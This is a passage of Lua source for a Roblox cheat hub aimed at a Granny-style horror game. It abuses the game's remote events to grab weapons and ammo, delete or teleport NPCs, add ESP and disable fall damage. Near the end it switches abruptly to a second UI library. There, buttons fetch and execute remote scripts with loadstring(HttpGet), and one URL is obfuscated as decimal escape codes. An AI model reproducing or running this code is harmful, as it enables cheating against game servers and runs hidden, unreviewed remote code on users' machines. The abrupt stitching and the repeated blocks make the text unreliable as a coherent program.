task.wait(0.3)


-- 3. 按顺序从背包掏出部件 (1, 2, 3)

local backpack = lp:FindFirstChild("Backpack")

if backpack then

for i = 1, 3 do

local toolName = "A part of a shotgun (" .. i .. ")"

local tool = backpack:FindFirstChild(toolName)

if tool and tool:IsA("Tool") then

tool.Parent = char

task.wait(0.1)

end

end

end


-- 4. 最终执行：动态寻找 Shotgun 交互事件 (执行者设为 lp)

-- 自动适配变化的 Preset 数字和路径

for _, folder in ipairs(workspace:GetChildren()) do

if string.find(folder.Name, "Preset") then

local locks = folder:FindFirstChild("Locks")

if locks then

-- 递归寻找 Shotgun 下的 InteractRemote

-- 这样无论在哪个 KeyCard Door 或索引下都能执行

for _, child in ipairs(locks:GetDescendants()) do

if child.Name == "Shotgun" then

local remote = child:FindFirstChild("InteractRemote")

if remote then

remote:FireServer(lp) -- 使用当前玩家作为参数

end

end

end

end

end

end 

end

})

GroupBox:AddLabel("子弹有限量力使用")

GroupBox:AddButton({

Text = '立即拾取子弹',

Func = function()

local lp = game:GetService("Players").LocalPlayer

-- 1. 遍历所有 Preset 文件夹并拾取所有 Bullet

for _, f in ipairs(workspace:GetChildren()) do

if f.Name:find("Preset") and f:FindFirstChild("Ammo") then

for _, i in ipairs(f.Ammo:GetChildren()) do

if i.Name:find("Bullet") and i:FindFirstChild("InteractRemote") then

i.InteractRemote:FireServer(lp)

end

end

end

end

-- 2. 自动触发装弹

local s = lp.Character:FindFirstChild("Shotgun") or lp.Backpack:FindFirstChild("Shotgun")

if s and s:FindFirstChild("Loaded") then s.Loaded:FireServer() end

end

})


GroupBox:AddToggle('AutoAllAmmoToggle', {

Text = '自动拾取所有子弹',

Default = false,

Callback = function(Value)

_G.AllAmmoLoop = Value

if Value then

task.spawn(function()

while _G.AllAmmoLoop do

local lp = game:GetService("Players").LocalPlayer

-- 1. 遍历所有 Preset 文件夹

for _, folder in ipairs(workspace:GetChildren()) do

if string.find(folder.Name, "Preset") then

local ammoFolder = folder:FindFirstChild("Ammo")

if ammoFolder then

-- 2. 遍历 Ammo 文件夹里的所有子物体

for _, item in ipairs(ammoFolder:GetChildren()) do

-- 只要名字包含 "Bullet" 就拾取

if string.find(item.Name, "Bullet") then

local remote = item:FindFirstChild("InteractRemote")

if remote then

-- 触发事件，参数为执行者自己

remote:FireServer(lp)

end

end

end

end

end

end

-- 3. 自动触发 Shotgun 装载逻辑

local char = lp.Character

local shotgun = char and char:FindFirstChild("Shotgun") or lp.Backpack:FindFirstChild("Shotgun")

if shotgun and shotgun:FindFirstChild("Loaded") then

shotgun.Loaded:FireServer()

end

task.wait(1) -- 循环频率，可根据需要调整

end

end)

end

end

})


local GroupBox = Tabs.Main:AddRightGroupbox("老奶功能", "angry")

GroupBox:AddLabel("立即删除老奶可能有点Bug虽然删除了\n可能还是会被老奶杀掉")

GroupBox:AddButton({

Text = "立即删除老奶",

Func = function()

-- 遍历 Workspace 寻找动态 Preset 文件夹

for _, folder in ipairs(workspace:GetChildren()) do

if folder.Name:find("Preset") then

-- 准确定位路径并执行删除

local locks = folder:FindFirstChild("Locks")

local target = locks and locks:FindFirstChild("Granny")

if target then

target:Destroy()

end

end

end

end

})



GroupBox:AddToggle('GrannyESP', {

Text = '老奶透视',

Default = false,

Callback = function(Value)

_G.GrannyESP = Value

if Value then

-- 开启循环检测

task.spawn(function()

while _G.GrannyESP do

-- 遍历所有文件夹寻找 Preset 路径

for _, folder in ipairs(workspace:GetChildren()) do

if folder.Name:find("Preset") then

local locks = folder:FindFirstChild("Locks")

local target = locks and locks:FindFirstChild("Granny")

if target and not target:FindFirstChild("ESPHighlight") then

-- 创建透视

local hl = Instance.new("Highlight")

hl.Name = "ESPHighlight"

hl.FillColor = Color3.fromRGB(255, 0, 0) -- 红色填充

hl.OutlineColor = Color3.fromRGB(255, 255, 255) -- 白色外框

hl.FillTransparency = 0.5

hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop

hl.Parent = target

end

end

end

task.wait(2) -- 每2秒扫描一次，防止路径变动或物体刷新

end

end)

else

-- 关闭时清除所有现有的透视

for _, folder in ipairs(workspace:GetChildren()) do

if folder.Name:find("Preset") then

local target = folder:FindFirstChild("Locks") and folder.Locks:FindFirstChild("Granny")

local hl = target and target:FindFirstChild("ESPHighlight")

if hl then hl:Destroy() end

end

end

end

end

})


GroupBox:AddLabel('有概率传送到外面\n为了防止被奶奶吃掉只能这样')


GroupBox:AddButton({

Text = "传送到奶奶身后",

Func = function()

local lp = game:GetService("Players").LocalPlayer

local char = lp.Character

local root = char and char:FindFirstChild("HumanoidRootPart")


if root then

local found = false

-- 扫描动态路径

for _, folder in ipairs(workspace:GetChildren()) do

if folder.Name:find("Preset") then

local target = folder:FindFirstChild("Locks") and folder.Locks:FindFirstChild("Granny")

if target then

-- 获取 Granny 的基础位置

local gPos = target:GetPivot().Position

-- 【偏移逻辑】

-- 在 X 轴偏移 8 格，Y 轴抬高 2 格（防掉地），Z 轴偏移 2 格

-- 这样距离大约是 8-9 个单位，比较安全

local safePos = gPos + Vector3.new(8, 2, 2)

-- 传送到位并强制面向 Granny 所在的位置

char:PivotTo(CFrame.lookAt(safePos, gPos))

found = true

print("成功传送到 Granny 附近的远端安全点")

break

end

end

end

if not found then end

else

end

end

})


local GroupBox = Tabs.Main:AddRightGroupbox("杂项", "bolt")

GroupBox:AddButton({

Text = "免疫跌落",

Func = function()

local lp = game:GetService("Players").LocalPlayer

-- 定义删除函数

local function cleanFall()

local fall = lp.PlayerGui:FindFirstChild("FallSystem", true)

if fall then

fall:Destroy()

end

end


-- 1. 立即执行一次清理

cleanFall()


-- 2. 监听 PlayerGui，一旦有新东西加入（重生时）就触发检查

lp.PlayerGui.ChildAdded:Connect(function()

-- 给系统一点加载时间，确保能抓到

task.wait(0.1)

cleanFall()

end)

-- 3. 针对 MainGUI 内部变化的二次监听（保险逻辑）

task.spawn(function()

while true do

cleanFall()

task.wait(2) -- 每2秒静默巡检一次

end

end)

end

})


GroupBox:AddToggle('AutoDeleteOpenObj', {

Text = '秒删附近的夹子',

Default = false,

Callback = function(Value)

_G.DeleteOpenLoop = Value

if Value then

task.spawn(function()

while _G.DeleteOpenLoop do

local lp = game:GetService("Players").LocalPlayer

local char = lp.Character

local root = char and char:FindFirstChild("HumanoidRootPart")

if root then

-- 1. 遍历 Workspace 中所有名为 Open 的物体

for _, obj in ipairs(workspace:GetChildren()) do

if obj.Name == "Open" then

-- 2. 计算距离，只删除附近的 (50格内)

-- 如果你想删除全图的，把 if 距离判断删掉即可

local distance = (obj:GetPivot().Position - root.Position).Magnitude

if distance < 50 then 

obj:Destroy()

end

end

end

-- 3. 同时也检查一下常见的层级路径（保险起见）

local folderOpen = workspace:FindFirstChild("Open")

if folderOpen then folderOpen:Destroy() end

end

task.wait(0.1) -- 高频检测

end

end)

end

end

})


local GroupBox = Tabs.Main1:AddLeftGroupbox("获取道具", "gem")

GroupBox:AddButton({

Text = "立即获取电击枪",

Func = function()

local lp = game:GetService("Players").LocalPlayer

local args = { lp } -- 动态使用当前玩家，避免硬编码名字导致失效


-- 遍历寻找动态的 Preset 文件夹

for _, folder in ipairs(workspace:GetChildren()) do

if folder.Name:find("Preset") then

-- 尝试在当前 Preset 下寻找 Stun gun

local stunGun = folder:FindFirstChild("Stun gun")

if stunGun then

local remote = stunGun:FindFirstChild("InteractRemote")

if remote then

-- 触发远程事件

remote:FireServer(unpack(args))

print("已触发路径: " .. stunGun:GetFullName())

end

end

end

end

end

})


GroupBox:AddButton({

Text = "立即获取电击子弹",

Func = function()

local lp = game:GetService("Players").LocalPlayer

local args = { lp }


-- 1. 动态寻找所有 Preset 下的电击子弹

for _, folder in ipairs(workspace:GetChildren()) do

if folder.Name:find("Preset") then

local ammoFolder = folder:FindFirstChild("Ammo")

local stunAmmo = ammoFolder and ammoFolder:FindFirstChild("Stun gun ammo")

if stunAmmo and stunAmmo:FindFirstChild("InteractRemote") then

stunAmmo.InteractRemote:FireServer(unpack(args))

end

end

end


-- 2. 触发装弹逻辑

local stunGun = lp.Character:FindFirstChild("Stun gun") or lp.Backpack:FindFirstChild("Stun gun")

if stunGun and stunGun:FindFirstChild("Loaded") then

stunGun.Loaded:FireServer()

end

end

})


GroupBox:AddToggle('AutoStunAmmo', {

Text = '自动补充电击子弹',

Default = false,

Callback = function(Value)

_G.LoopStun = Value

if Value then

task.spawn(function()

local lp = game:GetService("Players").LocalPlayer

local args = { lp }

while _G.LoopStun do

-- 拾取逻辑

for _, folder in ipairs(workspace:GetChildren()) do

if folder.Name:find("Preset") then

local ammo = folder:FindFirstChild("Ammo")

local target = ammo and ammo:FindFirstChild("Stun gun ammo")

if target and target:FindFirstChild("InteractRemote") then

target.InteractRemote:FireServer(unpack(args))

end

end

end

-- 装弹逻辑

local gun = lp.Character:FindFirstChild("Stun gun") or lp.Backpack:FindFirstChild("Stun gun")

if gun and gun:FindFirstChild("Loaded") then

gun.Loaded:FireServer()

end

task.wait(0.5) -- 每0.5秒补弹一次

end

end)

end

end

})


GroupBox:AddButton({

Text = "获取霰弹枪",

Func = function()

local lp = game:GetService("Players").LocalPlayer

local args = { lp }


-- 直接全图深度搜索，无视中间复杂的文件夹层级

for _, obj in ipairs(workspace:GetDescendants()) do

-- 寻找名字是 Shotgun 且父级包含 Preset 的物体

if obj.Name == "Shotgun" and obj:FindFirstChild("InteractRemote") then

-- 检查它的祖先里是否有 Preset 文件夹，确保找对目标

if obj:GetFullName():find("Preset") then

obj.InteractRemote:FireServer(unpack(args))

end

end

end

end

})


GroupBox:AddButton({

Text = "获取子弹",

Func = function()

local lp = game:GetService("Players").LocalPlayer

local args = { lp }


-- 1. 遍历 Workspace 寻找任何 Preset 文件夹

for _, folder in ipairs(workspace:GetChildren()) do

if folder.Name:find("Preset") then

local ammoFolder = folder:FindFirstChild("Ammo")

if ammoFolder then

-- 2. 遍历 Ammo 文件夹寻找任何 Bullet 开头的子弹

for _, item in ipairs(ammoFolder:GetChildren()) do

if item.Name:find("Bullet") then

local remote = item:FindFirstChild("InteractRemote")

if remote then

remote:FireServer(unpack(args))

end

end

end

end

end

end


-- 3. 自动装填（尝试适配所有可能的枪械）

local char = lp.Character

if char then

for _, tool in ipairs(char:GetChildren()) do

if tool:IsA("Tool") and tool:FindFirstChild("Loaded") then

tool.Loaded:FireServer()

end

end

end

end

})


GroupBox:AddToggle('AutoAllBulletLoop', {

Text = '自动补充子弹',

Default = false,

Callback = function(Value)

_G.LoopAllBullets = Value

if Value then

task.spawn(function()

local lp = game:GetService("Players").LocalPlayer

local args = { lp }

while _G.LoopAllBullets do

-- 扫描动态路径

for _, folder in ipairs(workspace:GetChildren()) do

if folder.Name:find("Preset") then

local ammo = folder:FindFirstChild("Ammo")

if ammo then

for _, item in ipairs(ammo:GetChildren()) do

-- 只要名字带 Bullet 就尝试拿取

if item.Name:find("Bullet") and item:FindFirstChild("InteractRemote") then

item.InteractRemote:FireServer(unpack(args))

end

end

end

end

end

-- 自动为当前手上的枪装弹

local tool = lp.Character and lp.Character:FindFirstChildOfClass("Tool")

if tool and tool:FindFirstChild("Loaded") then

tool.Loaded:FireServer()

end

task.wait(0.5)

end

end)

end

end

})


local GroupBox = Tabs.Main1:AddRightGroupbox("爷爷奶奶", "angry")

GroupBox:AddButton({

Text = "立即删除老奶",

Func = function()

-- 遍历 Workspace 寻找动态 Preset 文件夹

for _, folder in ipairs(workspace:GetChildren()) do

if folder.Name:find("Preset") then

-- 准确定位路径并执行删除

local locks = folder:FindFirstChild("Locks")

local target = locks and locks:FindFirstChild("Granny")

if target then

target:Destroy()

end

end

end

end

})



GroupBox:AddToggle('GrannyESP', {

Text = '老奶透视',

Default = false,

Callback = function(Value)

_G.GrannyESP = Value

if Value then

-- 开启循环检测

task.spawn(function()

while _G.GrannyESP do

-- 遍历所有文件夹寻找 Preset 路径

for _, folder in ipairs(workspace:GetChildren()) do

if folder.Name:find("Preset") then

local locks = folder:FindFirstChild("Locks")

local target = locks and locks:FindFirstChild("Granny")

if target and not target:FindFirstChild("ESPHighlight") then

-- 创建透视

local hl = Instance.new("Highlight")

hl.Name = "ESPHighlight"

hl.FillColor = Color3.fromRGB(255, 0, 0) -- 红色填充

hl.OutlineColor = Color3.fromRGB(255, 255, 255) -- 白色外框

hl.FillTransparency = 0.5

hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop

hl.Parent = target

end

end

end

task.wait(2) -- 每2秒扫描一次，防止路径变动或物体刷新

end

end)

else

-- 关闭时清除所有现有的透视

for _, folder in ipairs(workspace:GetChildren()) do

if folder.Name:find("Preset") then

local target = folder:FindFirstChild("Locks") and folder.Locks:FindFirstChild("Granny")

local hl = target and target:FindFirstChild("ESPHighlight")

if hl then hl:Destroy() end

end

end

end

end

})


GroupBox:AddButton({

Text = "立即删除爷爷",

Func = function()

for _, folder in ipairs(workspace:GetChildren()) do

if folder.Name:find("Preset") then

local target = folder:FindFirstChild("Locks") and folder.Locks:FindFirstChild("Grandpa")

if target then

target:Destroy()

end

end

end

end

})


-- 1. 透视：用开关控制，开启后自动追踪 Grandpa (Toggle)

GroupBox:AddToggle('ESP_Grandpa', {

Text = '透视爷爷',

Default = false,

Callback = function(Value)

_G.GrandpaESP = Value

task.spawn(function()

while _G.GrandpaESP do

for _, folder in ipairs(workspace:GetChildren()) do

if folder.Name:find("Preset") then

local g = folder:FindFirstChild("Locks") and folder.Locks:FindFirstChild("Grandpa")

if g and not g:FindFirstChild("Highlight") then

-- 添加高亮

local hl = Instance.new("Highlight", g)

hl.FillColor = Color3.fromRGB(255, 0, 0)

hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop

-- 添加标签

local b = Instance.new("BillboardGui", g)

b.AlwaysOnTop = true

b.Size = UDim2.new(0, 100, 0, 50)

local t = Instance.new("TextLabel", b)

t.Size = UDim2.new(1, 0, 1, 0)

t.Text = "爷爷"

t.TextColor3 = Color3.new(1, 0, 0)

t.BackgroundTransparency = 1

t.TextScaled = true

end

end

end

task.wait(2) -- 每2秒检查一次有没有新的 Grandpa

end

-- 关闭开关时清除透视

if not Value then

for _, obj in ipairs(workspace:GetDescendants()) do

if obj.Name == "Grandpa" then

if obj:FindFirstChild("Highlight") then obj.Highlight:Destroy() end

if obj:FindFirstChild("BillboardGui") then obj.BillboardGui:Destroy() end

end

end

end

end)

end

})


local GroupBox = Tabs.Main1:AddRightGroupbox("杂项", "bolt")

GroupBox:AddButton({

Text = "免疫跌落",

Func = function()

local lp = game:GetService("Players").LocalPlayer

-- 定义删除函数

local function cleanFall()

local fall = lp.PlayerGui:FindFirstChild("FallSystem", true)

if fall then

fall:Destroy()

end

end


-- 1. 立即执行一次清理

cleanFall()


-- 2. 监听 PlayerGui，一旦有新东西加入（重生时）就触发检查

lp.PlayerGui.ChildAdded:Connect(function()

-- 给系统一点加载时间，确保能抓到

task.wait(0.1)

cleanFall()

end)

-- 3. 针对 MainGUI 内部变化的二次监听（保险逻辑）

task.spawn(function()

while true do

cleanFall()

task.wait(2) -- 每2秒静默巡检一次

end

end)

end

})


GroupBox:AddToggle('AutoDeleteOpenObj', {

Text = '秒删附近的夹子',

Default = false,

Callback = function(Value)

_G.DeleteOpenLoop = Value

if Value then

task.spawn(function()

while _G.DeleteOpenLoop do

local lp = game:GetService("Players").LocalPlayer

local char = lp.Character

local root = char and char:FindFirstChild("HumanoidRootPart")

if root then

-- 1. 遍历 Workspace 中所有名为 Open 的物体

for _, obj in ipairs(workspace:GetChildren()) do

if obj.Name == "Open" then

-- 2. 计算距离，只删除附近的 (50格内)

-- 如果你想删除全图的，把 if 距离判断删掉即可

local distance = (obj:GetPivot().Position - root.Position).Magnitude

if distance < 50 then 

obj:Destroy()

end

end

end

-- 3. 同时也检查一下常见的层级路径（保险起见）

local folderOpen = workspace:FindFirstChild("Open")

if folderOpen then folderOpen:Destroy() end

end

task.wait(0.1) -- 高频检测

end

end)

end

end

})


local GroupBox = Tabs.Main2:AddLeftGroupbox("获取道具", "gem")

GroupBox:AddButton({

Text = "获取弹弓",

Func = function()

local lp = game:GetService("Players").LocalPlayer

local args = { lp }


-- 深度遍历扫描，自动适配 Preset 编号和层级

for _, obj in ipairs(workspace:GetDescendants()) do

-- 寻找名为 Slingshot 且包含交互事件的物体

if obj.Name == "Slingshot" and obj:FindFirstChild("InteractRemote") then

-- 检查路径中是否包含 Preset，确保是地图中的目标

if obj:GetFullName():find("Preset") then

obj.InteractRemote:FireServer(unpack(args))

end

end

end

end

})


GroupBox:AddButton({

Text = "获取弹弓弹药",

Func = function()

local lp = game:GetService("Players").LocalPlayer

local args = { lp }


-- 1. 扫描 Stones 文件夹下的所有石块

local stonesFolder = workspace:FindFirstChild("Stones")

if stonesFolder then

for _, stone in ipairs(stonesFolder:GetChildren()) do

-- 只要名字里带 Stone 且有远程事件就触发

if stone.Name:find("Stone") and stone:FindFirstChild("InteractRemote") then

stone.InteractRemote:FireServer(unpack(args))

end

end

end


-- 2. 自动装填（检查手上或背包）

local slingshot = lp.Character:FindFirstChild("Slingshot") or lp.Backpack:FindFirstChild("Slingshot")

if slingshot and slingshot:FindFirstChild("Loaded") then

slingshot.Loaded:FireServer()

end

end

})


GroupBox:AddToggle('AutoSlingshotAmmo', {

Text = '自动补充弹弓弹药',

Default = false,

Callback = function(Value)

_G.LoopSlingshot = Value

if Value then

task.spawn(function()

local lp = game:GetService("Players").LocalPlayer

local args = { lp }

while _G.LoopSlingshot do

-- 1. 拾取石块

local stones = workspace:FindFirstChild("Stones")

if stones then

for _, obj in ipairs(stones:GetChildren()) do

if obj.Name:find("Stone") and obj:FindFirstChild("InteractRemote") then

obj.InteractRemote:FireServer(unpack(args))

end

end

end

-- 2. 秒装弹（同时检测角色和背包）

local char = lp.Character

local backpack = lp.Backpack

local weapon = (char and char:FindFirstChild("Slingshot")) or (backpack and backpack:FindFirstChild("Slingshot"))

if weapon and weapon:FindFirstChild("Loaded") then

weapon.Loaded:FireServer()

end

task.wait(0.3) -- 补弹频率

end

end)

end

end

})


GroupBox:AddButton({

Text = "抢夺爷爷的霰弹枪",

Func = function()

local lp = game:GetService("Players").LocalPlayer

local args = { lp }


-- 1. 全图深度扫描，定位 Grandpa 路径下的 Shotgun

for _, obj in ipairs(workspace:GetDescendants()) do

-- 寻找名字是 Shotgun 的物体

if obj.Name == "Shotgun" then

-- 检查它的父级是否是 Grandpa，且包含远程事件

local parent = obj.Parent

if parent and parent.Name == "Grandpa" and obj:FindFirstChild("InteractRemote") then

-- 触发远程交互

obj.InteractRemote:FireServer(unpack(args))

end

end

end

-- 2. 备用逻辑：直接搜索任何在 Preset 下的 Grandpa 手里的枪

-- 这种写法无视 Preset2 还是 Preset3

for _, folder in ipairs(workspace:GetChildren()) do

if folder.Name:find("Preset") then

local grandpa = folder:FindFirstChild("Grandpa")

local shotgun = grandpa and grandpa:FindFirstChild("Shotgun")

if shotgun and shotgun:FindFirstChild("InteractRemote") then

shotgun.InteractRemote:FireServer(unpack(args))

end

end

end

end

})


GroupBox:AddButton({

Text = "立即获取子弹",

Func = function()

local lp = game:GetService("Players").LocalPlayer

local args = { lp }


-- 1. 动态匹配所有 Preset

for _, folder in ipairs(workspace:GetChildren()) do

if folder.Name:find("Preset") then

local ammoFolder = folder:FindFirstChild("Ammo")

if ammoFolder then

-- 2. 动态匹配所有名为 Bullet 的子弹 (Bullet5, Bullet7 等)

for _, bullet in ipairs(ammoFolder:GetChildren()) do

if bullet.Name:find("Bullet") and bullet:FindFirstChild("InteractRemote") then

bullet.InteractRemote:FireServer(unpack(args))

end

end

end

end

end


-- 3. 立即触发枪支装弹 (同时检测手上和背包)

local gun = lp.Character:FindFirstChild("Shotgun") or lp.Backpack:FindFirstChild("Shotgun")

if gun and gun:FindFirstChild("Loaded") then

gun.Loaded:FireServer()

end

end

})


GroupBox:AddToggle('AutoBulletPreset', {

Text = '自动补充子弹',

Default = false,

Callback = function(Value)

_G.LoopBulletPreset = Value

if Value then

task.spawn(function()

local lp = game:GetService("Players").LocalPlayer

local args = { lp }

while _G.LoopBulletPreset do

-- 扫描动态路径：workspace.Preset?.Ammo.Bullet?

for _, folder in ipairs(workspace:GetChildren()) do

if folder.Name:find("Preset") then

local ammo = folder:FindFirstChild("Ammo")

if ammo then

for _, b in ipairs(ammo:GetChildren()) do

if b.Name:find("Bullet") and b:FindFirstChild("InteractRemote") then

b.InteractRemote:FireServer(unpack(args))

end

end

end

end

end

-- 自动装填手上或背包里的霰弹枪

local gun = lp.Character:FindFirstChild("Shotgun") or lp.Backpack:FindFirstChild("Shotgun")

if gun and gun:FindFirstChild("Loaded") then

gun.Loaded:FireServer()

end

task.wait(0.3)

end

end)

end

end

})


local GroupBox = Tabs.Main2:AddRightGroupbox("爷爷奶奶", "angry")

-- 1. 透视控制 (使用 Toggle 开关)

GroupBox:AddToggle('ESP_Grandpa', {

Text = '透视爷爷',

Default = false,

Callback = function(Value)

_G.ESP_Grandpa = Value

task.spawn(function()

while _G.ESP_Grandpa do

for _, folder in ipairs(workspace:GetChildren()) do

if folder.Name:find("Preset") then

local g = folder:FindFirstChild("Grandpa")

if g and not g:FindFirstChild("Highlight") then

local hl = Instance.new("Highlight", g)

hl.FillColor = Color3.fromRGB(255, 0, 0)

hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop

end

end

end

task.wait(2)

end

-- 清理逻辑

for _, folder in ipairs(workspace:GetChildren()) do

local g = folder.Name:find("Preset") and folder:FindFirstChild("Grandpa")

if g and g:FindFirstChild("Highlight") then g.Highlight:Destroy() end

end

end)

end

})


GroupBox:AddToggle('ESP_Granny', {

Text = '透视奶奶',

Default = false,

Callback = function(Value)

_G.ESP_Granny = Value

task.spawn(function()

while _G.ESP_Granny do

for _, folder in ipairs(workspace:GetChildren()) do

if folder.Name:find("Preset") then

local g = folder:FindFirstChild("Granny")

if g and not g:FindFirstChild("Highlight") then

local hl = Instance.new("Highlight", g)

hl.FillColor = Color3.fromRGB(0, 255, 0)

hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop

end

end

end

task.wait(2)

end

-- 清理逻辑

for _, folder in ipairs(workspace:GetChildren()) do

local g = folder.Name:find("Preset") and folder:FindFirstChild("Granny")

if g and g:FindFirstChild("Highlight") then g.Highlight:Destroy() end

end

end)

end

})


-- 2. 删除控制 (使用 Button 点击)

GroupBox:AddButton({

Text = "立即删除爷爷",

Func = function()

for _, folder in ipairs(workspace:GetChildren()) do

if folder.Name:find("Preset") then

local target = folder:FindFirstChild("Grandpa")

if target then target:Destroy() end

end

end

end

})


GroupBox:AddButton({

Text = "立即删除奶奶",

Func = function()

for _, folder in ipairs(workspace:GetChildren()) do

if folder.Name:find("Preset") then

local target = folder:FindFirstChild("Granny")

if target then target:Destroy() end

end

end

end

})

GroupBox:AddLabel("让爷爷把奶奶打死↓")


local GrannyFollowLoop = false


GroupBox:AddToggle('LockGrannyToGrandpa', {

Text = '把奶奶传送到爷爷面前',

Default = false,

Callback = function(Value)

GrannyFollowLoop = Value

if Value then

task.spawn(function()

while GrannyFollowLoop do

local targetPreset = nil

-- 1. 动态寻找当前的 Preset 文件夹

for _, folder in ipairs(workspace:GetChildren()) do

if folder.Name:find("Preset") and folder:FindFirstChild("Grandpa") and folder:FindFirstChild("Granny") then

targetPreset = folder

break

end

end


if targetPreset then

local gp = targetPreset.Grandpa

local gn = targetPreset.Granny


-- 2. 获取核心部位坐标

local gpRoot = gp:FindFirstChild("HumanoidRootPart") or gp:FindFirstChild("Head") or gp:FindFirstChildOfClass("Part")

local gnRoot = gn:FindFirstChild("HumanoidRootPart") or gn:FindFirstChild("Head") or gn:FindFirstChildOfClass("Part")


if gpRoot and gnRoot then

-- 3. 将奶奶传送至爷爷正前方 2.5 单位处，并面对面

gnRoot.CFrame = gpRoot.CFrame * CFrame.new(0, 0, -2.5) * CFrame.Angles(0, math.pi, 0)

end

end

task.wait() -- 保持高频锁定

end

end)

end

end

})


local GroupBox = Tabs.Main2:AddRightGroupbox("杂项", "bolt")

GroupBox:AddButton({

Text = "免疫跌落",

Func = function()

local lp = game:GetService("Players").LocalPlayer

-- 定义删除函数

local function cleanFall()

local fall = lp.PlayerGui:FindFirstChild("FallSystem", true)

if fall then

fall:Destroy()

end

end


-- 1. 立即执行一次清理

cleanFall()


-- 2. 监听 PlayerGui，一旦有新东西加入（重生时）就触发检查

lp.PlayerGui.ChildAdded:Connect(function()

-- 给系统一点加载时间，确保能抓到

task.wait(0.1)

cleanFall()

end)

-- 3. 针对 MainGUI 内部变化的二次监听（保险逻辑）

task.spawn(function()

while true do

cleanFall()

task.wait(2) -- 每2秒静默巡检一次

end

end)

end

})


GroupBox:AddToggle('AutoDeleteOpenObj', {

Text = '秒删附近的夹子',

Default = false,

Callback = function(Value)

_G.DeleteOpenLoop = Value

if Value then

task.spawn(function()

while _G.DeleteOpenLoop do

local lp = game:GetService("Players").LocalPlayer

local char = lp.Character

local root = char and char:FindFirstChild("HumanoidRootPart")

if root then

-- 1. 遍历 Workspace 中所有名为 Open 的物体

for _, obj in ipairs(workspace:GetChildren()) do

if obj.Name == "Open" then

-- 2. 计算距离，只删除附近的 (50格内)

-- 如果你想删除全图的，把 if 距离判断删掉即可

local distance = (obj:GetPivot().Position - root.Position).Magnitude

if distance < 50 then 

obj:Destroy()

end

end

end

-- 3. 同时也检查一下常见的层级路径（保险起见）

local folderOpen = workspace:FindFirstChild("Open")

if folderOpen then folderOpen:Destroy() end

end

task.wait(0.1) -- 高频检测

end

end)

end

end

})


ThemeManager:SetLibrary(Library)

SaveManager:SetLibrary(Library)

ThemeManager:SetFolder('MorningSeven')

SaveManager:SetFolder('MorningSeven/configs')

SaveManager:IgnoreThemeSettings()

SaveManager:SetIgnoreIndexes({ 'MenuKeybind' })

ThemeManager:ApplyToTab(Tabs['UI Settings'])

SaveManager:BuildConfigSection(Tabs['UI Settings'])

SaveManager:LoadAutoloadConfig()


local RunService = game:GetService("RunService")

local CoreGui = game:GetService("CoreGui")

local RainbowSpeed = 0.2

local TargetObjects = {}


local function ScanUI()

table.clear(TargetObjects)

for _, obj in ipairs(CoreGui:GetDescendants()) do

if obj:IsA("TextLabel") or obj:IsA("TextButton") then

if obj.Text == "恐怖老奶" then

local main = obj.Parent

while main and main.Name ~= "Main" do main = main.Parent end

if main then

table.insert(TargetObjects, main)

if main:FindFirstChild("Outer") then table.insert(TargetObjects, main.Outer) end

if main:FindFirstChild("Inner") then table.insert(TargetObjects, main.Inner) end

end

elseif obj.Text == "切换UI" or obj.Text == "锁定UI" or obj.Text == "解锁UI" then

local target = obj:IsA("TextButton") and obj or obj.Parent

if target:IsA("GuiObject") then table.insert(TargetObjects, target) end

end

end

end

end


task.spawn(function()

while true do 

ScanUI() 

task.wait(3) 

end

end)


RunService.RenderStepped:Connect(function()

local rainbowColor = Color3.fromHSV(tick() * RainbowSpeed % 1, 0.8, 1)

for _, obj in ipairs(TargetObjects) do

pcall(function()

if obj:IsA("Frame") and (obj.Name == "Outer" or obj.Name == "Inner") then

obj.BackgroundColor3 = rainbowColor

elseif obj:FindFirstChildOfClass("UIStroke") then

obj:FindFirstChildOfClass("UIStroke").Color = rainbowColor

else

obj.BorderColor3 = rainbowColor

end

end)

end

end)


local RunService = game:GetService("RunService")

local Snowflakes = {}

task.spawn(function()

while not Library.ScreenGui do task.wait() end

local MainFrame = Library.ScreenGui:FindFirstChild("Main")

if not MainFrame then return end


local SnowContainer = Instance.new("Frame", MainFrame)

SnowContainer.Name = "SnowContainer"

SnowContainer.Size = UDim2.new(1, 0, 1, 0)

SnowContainer.BackgroundTransparency = 1

SnowContainer.ClipsDescendants = true

SnowContainer.ZIndex = 0


for i = 1, 40 do

local flake = Instance.new("TextLabel", SnowContainer)

flake.BackgroundTransparency = 1

flake.Text = "❄️"

flake.TextColor3 = Color3.fromRGB(255, 255, 255)

flake.TextTransparency = 0.5

flake.TextSize = math.random(8, 11)

flake.Position = UDim2.new(math.random(), 0, math.random(), 0)

flake.Size = UDim2.new(0, 15, 0, 15)

table.insert(Snowflakes, {

Obj = flake, 

Speed = math.random(22, 32) / 10000,

Sine = math.random() * math.pi * 2,

Swing = 0.0001

})

end

end)


RunService.RenderStepped:Connect(function()

local t = tick()

for _, s in ipairs(Snowflakes) do

local pos = s.Obj.Position

local newY = pos.Y.Scale + s.Speed

local newX = pos.X.Scale + math.sin(t + s.Sine) * s.Swing

if newY > 1.01 then 

newY = -0.05 

newX = math.random() 

end

if newY > 0.85 then

s.Obj.TextTransparency = 0.5 + (newY - 0.85) * 3

elseif newY < 0.1 then

s.Obj.TextTransparency = 1 - (newY + 0.1) * 3

else

s.Obj.TextTransparency = 0.5

end


s.Obj.Position = UDim2.new(newX, 0, newY, 0)

end

end)


Library:Notify("刘某脚本太好用了，我都忍不住夸")


        WindUI:Notify({
            Title = "刘某脚本太好用了",
            Content = "没办法",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "内脏与黑火药",
    Icon = "skull",
    Locked = false,
})

local Button = Tab:Button({
    Title = "清水脚本",
    Desc = "ui有点挡屏幕",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\102\121\46\97\112\112\47\65\51\78\113\122\52\78\112\47\114\97\119"))()
        WindUI:Notify({
            Title = "已加载",
            Content = "🤑",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "Katchi Hub2.1",
    Desc = "英文",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/XaviscoZ/roblox/refs/heads/main/g%26b.lua"))()
        WindUI:Notify({
            Title = "已加载",
            Content = "",
            Icon = "crown",
